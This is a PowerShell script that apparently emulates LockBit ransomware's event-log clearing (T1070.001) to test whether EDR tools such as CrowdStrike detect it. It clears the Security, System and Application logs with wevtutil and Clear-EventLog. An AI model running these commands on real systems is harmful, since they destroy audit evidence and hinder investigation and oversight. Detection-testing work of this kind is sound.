<#
.SYNOPSIS
    LockBit Clear Event Logs - DETECTION TRIGGER
.DESCRIPTION
    Clears Windows Security, System, and Application event logs.
    Will trigger EDR detection for T1070.001.
    REQUIRES ADMIN PRIVILEGES.
    TTP: T1070.001
#>
Write-Host "[*] Starting LockBit Event Log Clearing (T1070.001)" -ForegroundColor Cyan
Write-Host "[*] This will trigger EDR detection for indicator removal" -ForegroundColor Yellow

try {
    # Check if running as admin
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-Host "[!] WARNING: Not running as Administrator - log clearing will fail" -ForegroundColor Red
    }
    
    # ACTUAL DETECTION TRIGGER - Clear event logs
    Write-Host "[*] Executing: wevtutil cl Security"
    wevtutil cl Security 2>$null
    Write-Host "[+] Security log cleared" -ForegroundColor Green
    
    Write-Host "[*] Executing: wevtutil cl System"
    wevtutil cl System 2>$null
    Write-Host "[+] System log cleared" -ForegroundColor Green
    
    Write-Host "[*] Executing: wevtutil cl Application"
    wevtutil cl Application 2>$null
    Write-Host "[+] Application log cleared" -ForegroundColor Green
    
    # Also try PowerShell method
    Write-Host "[*] Executing: Clear-EventLog -LogName Security,System,Application"
    Clear-EventLog -LogName Security,System,Application -ErrorAction SilentlyContinue
    
    Write-Host "[+] SUCCESS: Event logs cleared" -ForegroundColor Green
    Write-Host "[!] CrowdStrike should detect: 'EventLogCleared' or 'IndicatorRemoval'" -ForegroundColor Magenta
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
